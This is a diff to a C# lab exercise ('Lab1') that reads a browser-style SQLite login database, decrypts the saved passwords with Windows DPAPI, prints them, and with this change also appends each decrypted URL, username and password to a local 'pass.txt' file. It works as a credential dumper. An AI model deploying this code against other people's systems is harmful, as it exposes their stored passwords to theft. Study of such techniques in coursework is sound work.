@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Text;
+using System.IO;
 using System.Data.SQLite;
 using System.Security.Cryptography;
 
@@ -17,7 +18,7 @@ namespace Lab1
         {
             try
             {
-                DeletePass(LOGIN);
+                //DeletePass(LOGIN);
                 //SetPassword();
                 GetDataInCache();
                 Console.ReadKey();
@@ -82,7 +83,7 @@ namespace Lab1
             System.Data.DataTable dt = new System.Data.DataTable();
             SQLiteConnection conn = new SQLiteConnection("Data Source=" + PATH_FILE + ";Version=3;");
             conn.Open();
-            string sqlQuery = "SELECT logins.origin_url, logins.username_value, logins.password_value FROM logins";
+            string sqlQuery = "SELECT logins.origin_url, logins.username_value, logins.password_value, logins.action_url FROM logins";
             SQLiteDataAdapter adapter = new SQLiteDataAdapter(sqlQuery, conn);
             adapter.Fill(dt);
 
@@ -90,10 +91,14 @@ namespace Lab1
             {
                 for (int i = 0; i < dt.Rows.Count; i++)
                 {
-                    Console.Write(i + 1 + ") " + dt.Rows[i][0]);
-                    Console.Write(" \t" + dt.Rows[i][1]);
                     string pass = new UTF8Encoding(true).GetString(DecryptData((byte[])dt.Rows[i][2], DataProtectionScope.CurrentUser));
-                    Console.Write(" \t" + pass + "\n");
+                    string curr_str = i + 1 + ") origin_url: " + dt.Rows[i][0] + 
+                                      "\n   username_value: " + dt.Rows[i][1] + 
+                                      "\n   action_url: " + dt.Rows[i][3] + 
+                                      "\n   password_value: " + pass;
+                    Console.WriteLine(curr_str);
+                    using (StreamWriter w = new StreamWriter("pass.txt", true, Encoding.GetEncoding(1251)))
+                        w.Write(curr_str);
                 }
             }
 
